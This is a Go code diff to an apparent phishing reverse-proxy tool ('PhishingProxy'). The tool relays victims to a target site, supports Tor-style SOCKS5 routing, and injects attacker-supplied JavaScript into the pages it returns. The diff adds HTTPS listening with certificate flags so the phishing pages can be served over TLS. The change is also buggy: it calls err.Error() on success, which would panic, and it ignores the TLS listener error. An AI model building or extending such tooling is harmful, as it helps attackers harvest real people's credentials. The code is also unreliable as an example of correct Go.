@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"bytes"
+	"crypto/tls"
 	"flag"
 	"fmt"
 	"io/ioutil"
@@ -30,6 +31,9 @@ var (
 	attachProfiler = flag.Bool("with-profiler", false, "Attach profiler to instance.")
 	proxyAddress   = flag.String("proxy", "", "Optional upstream SOCKS5 proxy. Useful for torification.")
 	javascriptURL  = flag.String("inject-js", "", "URL to a JavaScript file you want injected.")
+	insecure       = flag.Bool("insecure", false, "Listen without TLS.")
+	certPath       = flag.String("cert", "", "Path to the x509 encoded SSL certificate in PEM format.")
+	privateKeyPath = flag.String("private-key", "", "Path to the x509 encoded certificate in PEM format.")
 )
 
 // HTTPTransaction represents a complete request - response flow.
@@ -57,7 +61,10 @@ func (j JavaScriptInjectionTransformer) Transform(response *http.Response) error
 	// Prevent NewDocumentFromReader from closing the response body.
 	responseText, err := ioutil.ReadAll(response.Body)
 	responseBuffer := bytes.NewBuffer(responseText)
-	response.Body = ioutil.NopCloser(responseBuffer)
+	defer func(response *http.Response, responseBuffer *bytes.Buffer) {
+		response.Body = ioutil.NopCloser(responseBuffer)
+	}(response, responseBuffer)
+
 	if err != nil {
 		return err
 	}
@@ -114,7 +121,8 @@ func (p *PhishingProxy) HandleConnection(conn net.Conn, transactions chan<- *HTT
 	}
 
 	for _, transformer := range p.responseTransformers {
-		transformer.Transform(resp)
+		err := transformer.Transform(resp)
+		log.Println("Error transforming:", err.Error())
 	}
 
 	modifiedResponse, err := httputil.DumpResponse(resp, true)
@@ -152,6 +160,21 @@ func processTransactions(transactions <-chan *HTTPTransaction) {
 	}
 }
 
+func newTlsListener(address, certPath, privateKeyPath string) (net.Listener, error) {
+	cer, err := tls.LoadX509KeyPair(certPath, privateKeyPath)
+	if err != nil {
+		return nil, err
+	}
+
+	config := &tls.Config{Certificates: []tls.Certificate{cer}}
+	return tls.Listen("tcp", address, config)
+
+}
+
+func newInsecureListener(address string) (net.Listener, error) {
+	return net.Listen("tcp", address)
+}
+
 func main() {
 	flag.Parse()
 	log.Println("Setting target to", *targetURL)
@@ -159,12 +182,6 @@ func main() {
 	if err != nil {
 		panic(err.Error())
 	}
-
-	server, err := net.Listen("tcp", *address)
-	if err != nil {
-		panic(err.Error())
-	}
-	log.Println("Listening on:", *address)
 
 	client := &http.Client{
 		Timeout: DefaultTimeout,
@@ -198,6 +215,26 @@ func main() {
 		}()
 	}
 
+	var server net.Listener
+	if *insecure {
+		server, err = newInsecureListener(*address)
+		if err != nil {
+			panic(err)
+		}
+	} else {
+		if *privateKeyPath == "" && *certPath == "" {
+			panic("--private-key and --cert arguments must point to x509 encoded PEM private key and certificate, or call with the --insecure flag.")
+		}
+
+		server, err = newTlsListener(*address, *certPath, *privateKeyPath)
+	}
+	var listenAddr string
+	if *insecure {
+		listenAddr = fmt.Sprintf("http://%s", *address)
+	} else {
+		listenAddr = fmt.Sprintf("https://%s", *address)
+	}
+	log.Println("Listening on:", listenAddr)
 	transactions := make(chan *HTTPTransaction)
 	go processTransactions(transactions)
 	for {
